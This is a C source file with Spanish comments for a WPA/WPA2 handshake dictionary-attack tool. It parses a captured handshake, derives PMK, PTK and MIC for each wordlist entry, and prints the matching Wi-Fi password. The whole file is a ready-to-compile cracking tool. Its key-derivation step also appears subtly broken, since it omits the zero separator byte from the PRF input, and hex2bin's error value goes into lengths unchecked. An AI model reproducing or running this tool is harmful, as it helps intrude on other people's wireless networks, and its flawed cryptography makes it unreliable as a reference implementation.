#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/sha.h>
#include <openssl/hmac.h>
#include <openssl/evp.h>
#include <openssl/opensslv.h>

#define PMK_LEN 32
#define PTK_LEN 64
#define MIC_LEN 16
#define MAX_LINE 1024

// Definir SHA1_DIGEST_LENGTH si no está definido
#ifndef SHA1_DIGEST_LENGTH
#define SHA1_DIGEST_LENGTH 20
#endif

typedef struct {
    unsigned char essid[36];
    size_t essid_len;
    unsigned char mac_ap[6];
    unsigned char mac_sta[6];
    unsigned char nonce_ap[32];
    unsigned char nonce_sta[32];
    unsigned char eapol[256];
    size_t eapol_size;
    unsigned char keymic[16];
} wpa_data;

// Función para generar PMK (PBKDF2-SHA1)
static void generate_pmk(const char *password, const unsigned char *essid, 
                        size_t essid_len, unsigned char *pmk) {
    PKCS5_PBKDF2_HMAC_SHA1(
        password, strlen(password),
        essid, essid_len,
        4096,
        PMK_LEN,
        pmk
    );
}

// Función para generar PTK
static void generate_ptk(const unsigned char *pmk,
                        const unsigned char *mac_ap,
                        const unsigned char *mac_sta,
                        const unsigned char *nonce_ap,
                        const unsigned char *nonce_sta,
                        unsigned char *ptk) {
    unsigned char pke[100];
    unsigned char data[76];
    const char *prefix = "Pairwise key expansion";
    
    memcpy(pke, prefix, 22);
    pke[22] = 0;
    
    // Ordenar MACs y Nonces
    if (memcmp(mac_ap, mac_sta, 6) < 0) {
        memcpy(data, mac_ap, 6);
        memcpy(data + 6, mac_sta, 6);
    } else {
        memcpy(data, mac_sta, 6);
        memcpy(data + 6, mac_ap, 6);
    }
    
    if (memcmp(nonce_ap, nonce_sta, 32) < 0) {
        memcpy(data + 12, nonce_ap, 32);
        memcpy(data + 44, nonce_sta, 32);
    } else {
        memcpy(data + 12, nonce_sta, 32);
        memcpy(data + 44, nonce_ap, 32);
    }
    
    // PRF-512
    unsigned char buff[SHA1_DIGEST_LENGTH];
    HMAC_CTX *ctx = HMAC_CTX_new();
    
    for(int i = 0; i < 4; i++) {
        HMAC_Init_ex(ctx, pmk, PMK_LEN, EVP_sha1(), NULL);
        HMAC_Update(ctx, pke, 22);
        HMAC_Update(ctx, data, 76);
        HMAC_Update(ctx, (unsigned char*)&i, 1);
        unsigned int len;
        HMAC_Final(ctx, buff, &len);
        memcpy(ptk + i * SHA1_DIGEST_LENGTH, buff, SHA1_DIGEST_LENGTH);
        HMAC_CTX_reset(ctx);
    }
    
    HMAC_CTX_free(ctx);
}

// Función para calcular MIC
static void calculate_mic(const unsigned char *kck,
                         const unsigned char *eapol,
                         size_t eapol_size,
                         unsigned char *mic) {
    unsigned char buff[SHA1_DIGEST_LENGTH];
    unsigned int len;
    
    HMAC(EVP_sha1(), kck, 16, eapol, eapol_size, buff, &len);
    memcpy(mic, buff, MIC_LEN);
}

// Función para convertir hex string a bytes
static int hex2bin(const char *hex, unsigned char *bin, size_t max_len) {
    size_t hex_len = strlen(hex);
    if (hex_len % 2 != 0 || hex_len/2 > max_len) return -1;
    
    for (size_t i = 0; i < hex_len; i += 2) {
        char byte[3] = {hex[i], hex[i+1], 0};
        bin[i/2] = (unsigned char)strtol(byte, NULL, 16);
    }
    return hex_len/2;
}

// Función principal
int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <hash_file> <wordlist_file>\n", argv[0]);
        return 1;
    }

    // Leer el hash
    FILE *hash_file = fopen(argv[1], "r");
    if (!hash_file) {
        fprintf(stderr, "Error opening hash file\n");
        return 1;
    }

    char line[MAX_LINE];
    if (!fgets(line, sizeof(line), hash_file)) {
        fprintf(stderr, "Error reading hash file\n");
        fclose(hash_file);
        return 1;
    }
    fclose(hash_file);

    // Parsear el hash (formato: CB$WPA$VERSION$ESSID$MAC_AP$MAC_STA$NONCE_AP$NONCE_STA$EAPOL$KEYMIC)
    wpa_data data = {0};
    char *token = strtok(line, "$");
    int field = 0;
    
    while (token && field < 10) {
        switch(field) {
            case 3: // ESSID
                data.essid_len = hex2bin(token, data.essid, sizeof(data.essid));
                break;
            case 4: // MAC_AP
                hex2bin(token, data.mac_ap, sizeof(data.mac_ap));
                break;
            case 5: // MAC_STA
                hex2bin(token, data.mac_sta, sizeof(data.mac_sta));
                break;
            case 6: // NONCE_AP
                hex2bin(token, data.nonce_ap, sizeof(data.nonce_ap));
                break;
            case 7: // NONCE_STA
                hex2bin(token, data.nonce_sta, sizeof(data.nonce_sta));
                break;
            case 8: // EAPOL
                data.eapol_size = hex2bin(token, data.eapol, sizeof(data.eapol));
                break;
            case 9: // KEYMIC
                hex2bin(token, data.keymic, sizeof(data.keymic));
                break;
        }
        token = strtok(NULL, "$");
        field++;
    }

    // Abrir wordlist
    FILE *wordlist = fopen(argv[2], "r");
    if (!wordlist) {
        fprintf(stderr, "Error opening wordlist\n");
        return 1;
    }

    // Intentar cada contraseña
    char password[MAX_LINE];
    unsigned char pmk[PMK_LEN];
    unsigned char ptk[PTK_LEN];
    unsigned char calculated_mic[MIC_LEN];
    int found = 0;
    unsigned long long attempts = 0;

    printf("Starting dictionary attack...\n");
    printf("Target Network: %s\n", data.essid);

    while (fgets(password, sizeof(password), wordlist)) {
        // Eliminar newline
        password[strcspn(password, "\r\n")] = 0;
        attempts++;

        if (attempts % 1000 == 0) {
            printf("\rTried %llu passwords...", attempts);
            fflush(stdout);
        }

        // Generar PMK
        generate_pmk(password, data.essid, data.essid_len, pmk);
        
        // Generar PTK
        generate_ptk(pmk, data.mac_ap, data.mac_sta,
                    data.nonce_ap, data.nonce_sta, ptk);
        
        // Calcular MIC
        calculate_mic(ptk, data.eapol, data.eapol_size, calculated_mic);
        
        // Comparar MIC
        if (memcmp(calculated_mic, data.keymic, MIC_LEN) == 0) {
            printf("\nPassword found: %s\n", password);
            printf("Attempts: %llu\n", attempts);
            found = 1;
            break;
        }
    }

    if (!found) {
        printf("\nPassword not found after %llu attempts\n", attempts);
    }

    fclose(wordlist);
    return 0;
}
